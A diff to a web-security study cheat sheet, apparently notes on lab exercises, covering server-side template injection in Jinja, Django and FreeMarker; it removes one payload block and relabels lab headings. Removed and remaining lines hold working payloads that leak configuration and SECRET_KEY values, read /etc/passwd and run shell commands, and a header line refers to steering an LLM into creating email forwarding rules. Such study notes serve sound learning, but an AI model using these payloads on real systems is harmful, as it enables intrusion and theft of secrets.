@@ -3146,12 +3146,7 @@ LLM -> API: create_email_forwarding_rule('peter')
 	</body>
 	</html>
     ```
-- Example payload
-  ```
-  {{ config.items() }} #leak configuration data  
-  {{ self._template.__globals__.__builtins__.eval('open("/etc/passwd").read()') }} #read the /etc/passwd  
-  http://example.com/greet?name=${T(java.lang.Runtime).getRuntime().exec('ls')} 
-  ```
+
 **How to detect SSTI**
 - Fuzzing with payloads `{{7*7}}`, `${7*7}`, `<%= 7 * 7 %>`
 - Error message: "TemplateSyntaxError", "UndefinedError"
@@ -3234,7 +3229,7 @@ LLM -> API: create_email_forwarding_rule('peter')
 - Server-side template injection with **information disclosure** via user-supplied objects
   - Try invalid fuzz string `${{<%[%'"}}%\` > "Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py"
   - Study the settings object in the **Django** documentation > `{{ settings.SECRET_KEY }}`
-- Server-side template injection in a **sandboxed** environment
+- Server-side template injection in a **sandboxed environment (Expert)**
   - Tr invalid template string ${product.priceZZ}  > "FreeMarker template error (DEBUG mode; use RETHROW in production!)"
   - Study the FreeMarker(Java) > Sandbox bypass
     ```
@@ -3249,7 +3244,7 @@ LLM -> API: create_email_forwarding_rule('peter')
     `<#assign classloader=product.class.protectionDomain.classLoader>`
   - Read the my_password.txt from home directory
     `${dwf.newInstance(ec,null)("cat my_password.txt ")}`
-- Server-side template injection with a **custom exploit**
+- Server-side template injection with a **custom exploit (Expert)**
   - Upload invalid avatar img
     ```
     PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
